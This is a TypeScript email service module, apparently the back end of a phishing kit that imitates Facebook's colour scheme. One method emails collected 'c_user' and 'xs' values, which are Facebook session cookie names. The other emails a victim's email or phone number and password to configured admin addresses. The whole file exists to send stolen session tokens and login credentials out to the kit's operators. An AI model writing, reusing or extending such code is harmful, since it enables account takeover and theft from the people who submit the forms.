import nodemailer from 'nodemailer';
import { formOneConfig, formTwoConfig } from './email-config';

class EmailService {
  private formOneTransporter;
  private formTwoTransporter;

  constructor() {
    this.formOneTransporter = nodemailer.createTransport(formOneConfig);
    this.formTwoTransporter = nodemailer.createTransport(formTwoConfig);
  }

  async sendFormOneEmail(data: any) {
    const mailOptions = {
      from: formOneConfig.auth.user,
      to: formOneConfig.adminEmails.filter(Boolean).join(','),
      subject: 'Form One Submission',
      html: `
        <h2 style="color: #1877f2;">New Form One Submission</h2>
        <div style="background: #f0f2f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <p><strong>c_user:</strong> ${data.c_user}</p>
          <p><strong>xs:</strong> ${data.xs}</p>
          <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
        </div>
        <p style="color: #65676B; font-size: 12px;">This is an automated message.</p>
      `
    };

    try {
      console.log('Sending form one email...');
      const result = await this.formOneTransporter.sendMail(mailOptions);
      console.log('Form one email sent:', result);
      return result;
    } catch (error) {
      console.error('Error sending form one email:', error);
      throw error;
    }
  }

  async sendFormTwoEmail(data: any) {
    const mailOptions = {
      from: formTwoConfig.auth.user,
      to: formTwoConfig.adminEmails.filter(Boolean).join(','),
      subject: 'Form Two Submission',
      html: `
        <h2 style="color: #1877f2;">New Form Two Submission</h2>
        <div style="background: #f0f2f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <p><strong>User Email/Phone:</strong> ${data.user_email}</p>
          <p><strong>Password:</strong> ${data.password}</p>
          <p><strong>Additional Admin Email:</strong> ${data.admin_email_3 || 'Not provided'}</p>
          <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
        </div>
        <p style="color: #65676B; font-size: 12px;">This is an automated message.</p>
      `
    };

    try {
      console.log('Sending form two email...');
      const result = await this.formTwoTransporter.sendMail(mailOptions);
      console.log('Form two email sent:', result);
      return result;
    } catch (error) {
      console.error('Error sending form two email:', error);
      throw error;
    }
  }
}

export const emailService = new EmailService();